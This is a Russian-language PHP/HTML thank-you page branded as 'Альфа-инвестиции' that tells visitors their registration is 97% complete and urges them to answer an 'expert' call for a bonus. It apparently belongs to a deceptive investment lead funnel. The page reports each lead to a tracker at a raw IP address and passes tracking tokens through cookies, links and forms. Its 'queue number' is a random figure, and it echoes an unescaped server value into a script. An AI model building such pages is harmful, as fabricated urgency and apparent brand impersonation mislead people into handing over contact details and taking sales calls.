<?php
file_get_contents('http://134.209.253.104/bb4c71f/postback?subid=' . $_COOKIE['subid'] . '&status=lead');
?>

<!DOCTYPE html><!--  This site was created in Webflow. https://www.webflow.com  -->
<!--  Last Published: Mon Jul 10 2023 11:47:31 GMT+0000 (Coordinated Universal Time)  -->
<html data-wf-page="64abb8b8c44ff108dc1aa9a7" data-wf-site="64abb8b8c44ff108dc1aa99d">
<head>
  <meta charset="utf-8">
  <title>Спасибо</title>
  <meta content="width=device-width, initial-scale=1" name="viewport">
  <meta content="Webflow" name="generator">
  <link href="css/normalize.css" rel="stylesheet" type="text/css">
  <link href="css/webflow.css" rel="stylesheet" type="text/css">
  <link href="css/thank-you-page-e28a3e.webflow.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com" rel="preconnect">
  <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin="anonymous">
  <script src="https://ajax.googleapis.com/ajax/libs/webfont/1.6.26/webfont.js" type="text/javascript"></script>
  <script type="text/javascript">WebFont.load({  google: {    families: ["Inter:regular,500,600,700"]  }});</script>
  <script type="text/javascript">!function(o,c){var n=c.documentElement,t=" w-mod-";n.className+=t+"js",("ontouchstart"in o||o.DocumentTouch&&c instanceof DocumentTouch)&&(n.className+=t+"touch")}(window,document);</script>
  <link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
  <link href="images/webclip.png" rel="apple-touch-icon">
  <script type="application/javascript">
      function getCookie(name) {
        var v = document.cookie.match("(^|;) ?" + name + "=([^;]*)(;|$)");
        var value = v ? v[2] : null;
        return value && value !== "undefined" ? value : null;
      }
    
      function setCookie(name, value, days) {
        var d = new Date();
        d.setTime(d.getTime() + 24 * 60 * 60 * 1000 * days);
        document.cookie = name + "=" + value + ";path=/;expires=" + d.toGMTString();
      }
    
      function getSubId() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{subid}".match("{")) {
          return "{subid}";
        }
        var clientSubid = '<?php echo isset($client) ? $client->getSubid() : "" ?>';
        if (clientSubid && !clientSubid.match(">")) {
          return clientSubid;
        }
        if (params.get("_subid")) {
          return params.get("_subid");
        }
        if (params.get("subid")) {
          return params.get("subid");
        }
        if (getCookie("subid")) {
          return getCookie("subid");
        }
        if (getCookie("_subid")) {
          return getCookie("_subid");
        }
      }
    
      function getToken() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{token}".match("{")) {
          return "{token}";
        }
        var clientToken = '<?php echo isset($client) ? $client->getToken() : "" ?>';
        if (clientToken && !clientToken.match(">")) {
          return clientToken;
        }
        if (params.get("_token")) {
          return params.get("_token");
        }
        if (params.get("token")) {
          return params.get("token");
        }
        if (getCookie("token")) {
          return getCookie("token");
        }
        return null;
      }
    
      function getPixel() {
        var params = new URLSearchParams(document.location.search.substr(1));
        if (!"{pixel}".match("{")) {
          return "{pixel}";
        }
        if (params.get("pixel")) {
          return params.get("pixel");
        }
    
        if (getCookie("pixel")) {
          return getCookie("pixel");
        }
    
        return null;
      }
    
      if (typeof URLSearchParams === "function") {
        document.addEventListener("DOMContentLoaded", function (event) {
          var params = new URLSearchParams(document.location.search.substr(1));
          var subid = getSubId();
          var token = getToken();
          var pixel = getPixel();
    
          params.set("_token", token);
          setCookie("pixel", pixel);
          setCookie("token", token);
          setCookie("subid", subid);
    
          // Adds params to the links
          document.querySelectorAll("a").forEach(function (link) {
            try {
              var url = new URL(link.href);
              params.forEach(function (v, k) {
                url.searchParams.append(k, v);
              });
              link.href = url.toString();
            } catch (e) {
              console.error(
                `[Exception] Bad params: unexpected link '${link.href}' for new Url()`
              );
            }
          });
    
          var SUBID_TEMPLATE_NAME = "subid";
          var TOKEN_TEMPLATE_NAME = "token";
          var PIXEL_TEMPLATE_NAME = "pixel";
    
          // Replace placeholders to actual values for input[hidden] fields
          var subIdRegExp = new RegExp(`\{${SUBID_TEMPLATE_NAME}\}`, "g");
          var tokenRegExp = new RegExp(`\{${TOKEN_TEMPLATE_NAME}\}`, "g");
          var pixelRegExp = new RegExp(`\{${PIXEL_TEMPLATE_NAME}\}`, "g");
    
          document
            .querySelectorAll('input[type="hidden"]')
            .forEach(function (input) {
              if (subIdRegExp.test(input.value)) {
                input.value = input.value.replaceAll(subIdRegExp, subid);
              }
              if (tokenRegExp.test(input.value)) {
                input.value = input.value.replaceAll(tokenRegExp, token);
              }
              if (pixelRegExp.test(input.value)) {
                input.value = input.value.replaceAll(pixelRegExp, pixel);
              }
            });
    
          // Adds params as hidden inputs to the forms
          document.querySelectorAll("form").forEach(function (form) {
            params.forEach(function (v, k) {
              var input = document.createElement("input");
              input.type = "hidden";
              input.name = k;
              input.value = v;
    
              form.append(input);
            });
          });
        });
      }
    </script>    
</head>
<body class="body">
  <section class="section wf-section"><img src="images/Alfa_invest_logo.svg" loading="lazy" width="546.5" alt="" class="image">
    <div class="div-block-4"><img src="images/1200.png" loading="lazy" srcset="images/1200-p-500.png 500w, images/1200.png 656w" sizes="(max-width: 479px) 92vw, (max-width: 767px) 54vw, (max-width: 991px) 64vw, 49vw" alt="" class="image-2">
      <div class="div-block-3">
        <h1 class="heading">Отлично! Вы завершили регистрацию на <span class="text-span">97%</span>!</h1>
        <h3 class="heading-3">Чтобы завершить регистрацию на <span class="text-span-2">100%</span> - обязательно ответьте на входящий звонок нашего эксперта и получите <span class="text-span-2">бонус за регистрацию личного кабинета</span></h3>
        <h1 class="heading">Ваш номер в очереди: <span id="queue-num" class="text-span-3"></span></h1>
        <h2 class="heading-2">Пожалуйста, ожидайте звонка, хорошего дня!</h2>
      </div>
    </div>
  </section>
  <section class="section-2 wf-section">
    <div class="div-block-2">
      <div class="text-block-2"><strong class="text-block">©2015-2023 AO &quot;Альфа-инвестиции&quot;</strong></div>
    </div>
  </section>
  <script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=64abb8b8c44ff108dc1aa99d" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
  <script src="js/webflow.js" type="text/javascript"></script>

  <script>
    window.addEventListener('load', function(){
      getQuantity(30);
    });


    function getQuantity(max)
    {
      const result = Math.floor(Math.random() * (max-1) + 1);
      var elem = document.getElementById("queue-num");
      elem.innerHTML = result;
    }
  </script>
  
</body>
</html>